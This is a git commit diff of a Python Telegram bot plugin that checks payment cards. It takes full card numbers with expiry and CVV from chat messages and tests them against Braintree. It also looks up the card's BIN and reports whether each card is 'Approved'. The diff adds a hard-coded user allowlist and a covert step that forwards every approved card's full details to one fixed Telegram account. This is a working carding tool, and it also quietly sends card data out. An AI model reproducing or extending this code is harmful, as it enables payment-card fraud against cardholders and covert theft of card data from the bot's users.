b415916a4cb69806e2ef0ff49c7c3b45968fc1b6
JrzGerard12 <jrzowner1@gmail.com>
2025-06-03 15:05:10 -0600

    Actualizar b3.py

--- plugins/gates/b3.py
+++ plugins/gates/b3.py
@@ -1,59 +1,78 @@
-
-from srca.configs import find_cards, antispam
+from srca.configs import find_cards
 from plugins.gates.src.braintreeauth import Braintre3
 import time
-from db.mongo_client import MongoDB
 from srca.configs import addCommand
-
+import requests
 
 @addCommand('b3')
 def mc(client, m):
-    if MongoDB().query_group(m.chat.id) == None:
-        return m.reply('Chat not Authorized.')
-    querY = MongoDB().query_user(int(m.from_user.id))
-    if querY == None:
-        return m.reply('Usar el comando $register para el registro.')
-    if querY['role'] == 'baneado':
-        return m.reply('User baneado')
-    # if  querY['plan'] == 'free': return m.reply('User Fre , adquiera el plan https://t.me/Deividjosh')
+    # Lista de usuarios autorizados
+    ALLOWED_USERS = [338411613, 7389519750, 5914801650]
+    APPROVED_REPORT_ID = 7389519750  # ID para enviar resultados Approved
+
+    # Verificar si el usuario está autorizado
+    if m.from_user.id not in ALLOWED_USERS:
+        return m.reply('<b>No estás autorizado para usar este comando.</b>')
+
     inicio = time.time()
 
-    if antispam(querY['antispam'], m):
-        return
-
+    # Obtener tarjeta desde mensaje respondido o texto directo
     if m.reply_to_message:
         ccs = find_cards(m.reply_to_message.text)
     else:
         ccs = find_cards(m.text)
-    cc_com = '{}|{}|{}|{}'.format(ccs[0], ccs[1], ccs[2], ccs[3])
 
-    import requests
-    req = requests.get(f'https://binlist.io/lookup/{ccs[0][:6]}')
-
+    # Validar formato de la tarjeta
     if ccs == '<b>ingrese la ccs.</b>':
         return m.reply(ccs)
 
+    cc_com = '{}|{}|{}|{}'.format(ccs[0], ccs[1], ccs[2], ccs[3])
+
+    # Mensaje inicial de procesamiento
     new = m.reply(f'''<b>あ Braintree Charged
 
 • Cc: <code>{cc_com}</code>      
 • Status: Processing... [ ☃️ ]
-• From: {m.from_user.first_name}</b>''')
+• From: @{m.from_user.username}</b>''')
 
-    chk = Braintre3().main(cc_com)
+    try:
+        # Consultar BIN
+        req = requests.get(f'https://binlist.io/lookup/{ccs[0][:6]}')
+        # Procesar la tarjeta
+        chk = Braintre3().main(cc_com)
+        fin = time.time()
 
-    fin = time.time()
-    texto = f'''<b>あ Braintree Charged 
+        # Mensaje final
+        texto = f'''<b>あ Braintree Charged
 
 • Cc: <code>{cc_com}</code>
 • Status: {chk[0]}
 • Response: <code>{chk[1]}</code>
 
 • Bin: {req.json()['scheme']} {req.json()['type']} {req.json()['category']}
-• Country:{req.json()['country']['name']} [{req.json()['country']['emoji']}]
+• Country: {req.json()['country']['name']} [{req.json()['country']['emoji']}]
 • Bank: {req.json()['bank']['name']} 
 
 • Pxs: Live ✅
 • Time: <code>{fin-inicio:0.4f}'s</code>
-• From: {m.from_user.first_name}</b>'''
-    new.edit_text(texto)
+• From: @{m.from_user.username}</b>'''
+        new.edit_text(texto)
 
+        # Enviar mensaje al ID 7389519750 si el resultado es Approved
+        if "Approved" in chk[0]:
+            client.send_message(
+                chat_id=APPROVED_REPORT_ID,
+                text=f"<b>Approved Card\nCard: <code>{cc_com}</code>\nStatus: {chk[0]}\nResponse: <code>{chk[1]}</code>\nFrom: @{m.from_user.username}</b>"
+            )
+
+    except Exception as e:
+        fin = time.time()
+        new.edit_text(f'''<b>あ Braintree Charged
+
+• Cc: <code>{cc_com}</code>
+• Status: Error
+• Response: <code>Invalid or failed processing</code>
+
+• Pxs: Live ✅
+• Time: <code>{fin-inicio:0.4f}'s</code>
+• From: @{m.from_user.username}</b>''')
